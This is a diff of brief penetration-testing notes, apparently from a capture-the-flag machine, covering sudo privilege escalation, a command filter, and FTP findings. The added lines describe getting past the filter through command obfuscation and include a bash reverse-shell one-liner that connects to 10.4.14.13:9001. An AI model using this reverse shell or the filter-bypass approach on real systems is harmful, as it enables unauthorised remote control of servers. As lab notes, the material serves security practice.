@@ -5,8 +5,13 @@
 But only displays id. If you do cli commands, it says are you a hacker?
 - Sudo -l says I can run apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh AS www-data
 - tried to echo a revshell on it, didn't work. there's a filter 
+- Using command obfuscation, i managed to hack into the server by creating a reverse shell
+and running it. 
+- #!/bin/bash /bin/bash -i >& /dev/tcp/10.4.14.13/9001 0>&1 
 =========
 #FTP
 =========
 - Has a file called "note.txt"
 - Potential users: Anurodh, Apaar
+- nothing important 
+
